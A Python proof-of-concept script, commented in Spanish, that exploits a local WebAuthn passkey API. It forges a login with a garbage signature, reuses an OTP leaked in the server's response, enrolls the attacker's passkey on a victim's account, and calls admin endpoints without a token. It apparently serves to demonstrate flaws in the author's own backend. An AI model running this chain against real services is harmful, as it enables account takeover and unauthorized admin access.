import httpx, base64, json, sys
API = "http://localhost:8000"; ORIGIN = "http://localhost:3000"
b64 = lambda d: base64.urlsafe_b64encode(json.dumps(d).encode()).decode().rstrip("=")
c = httpx.Client(base_url=API)

print("== 1. La víctima enrola una passkey (simulado) ==")
c.post("/auth/register/begin", json={"email": "victima@empresa.com"})
r = c.post("/auth/register/complete", json={"email": "victima@empresa.com", "device_name": "Notebook víctima",
    "credential": {"id": "cred-victima", "response": {"clientDataJSON": b64({"type": "webauthn.create", "origin": ORIGIN}), "attestationObject": "AAAA"}}})
print(r.status_code, r.json().get("message"))

print("\n== 2. Atacante: obtiene el credential_id de la víctima con solo saber el email ==")
opts = c.post("/auth/login/begin", json={"email": "victima@empresa.com"}).json()
cred_id = opts["allowCredentials"][0]["id"]; print("credential_id expuesto:", cred_id)

print("\n== 3. Atacante: login SIN autenticador, firma basura y sin challenge ==")
forged = {"id": cred_id, "response": {"clientDataJSON": b64({"type": "webauthn.get", "origin": ORIGIN}),
          "authenticatorData": "basura", "signature": "basura"}}
r = c.post("/auth/login/complete", json={"email": "victima@empresa.com", "credential": forged})
j = r.json(); print(r.status_code, {k: (str(v)[:40] + "...") if k.endswith("token") else v for k, v in j.items() if k in ("success","access_token","requires_stepup","otp_code","stepup_token")})

if j.get("requires_stepup"):
    print("\n== 3b. Step-up: el OTP vino en la misma respuesta ==")
    r = c.post("/auth/stepup/verify", json={"stepup_token": j["stepup_token"], "verification_type": "otp", "verification_data": {"otp": j["otp_code"]}})
    print(r.status_code, "access_token" in r.text)

print("\n== 4. Atacante: enrola SU passkey en la cuenta de la víctima, sin estar logueado ==")
r = c.post("/auth/register/complete", json={"email": "victima@empresa.com", "device_name": "Atacante",
    "credential": {"id": "cred-atacante", "response": {"clientDataJSON": b64({"type": "webauthn.create", "origin": ORIGIN}), "attestationObject": "AAAA"}}})
print(r.status_code, r.json().get("message"))

print("\n== 5. Endpoints de administración sin token ==")
print("GET  /admin/policies ->", c.get("/admin/policies").status_code)
pol = c.get("/admin/policies").json(); pol = pol.get("policies", pol) if isinstance(pol, dict) else pol
pid = pol[0]["id"]
print("PUT  /admin/policies/{id}/toggle ->", c.put(f"/admin/policies/{pid}/toggle").status_code)
print("GET  /passkeys/victima@empresa.com ->", c.get("/passkeys/victima@empresa.com").status_code)
print("GET  /audit/events ->", c.get("/audit/events").status_code)
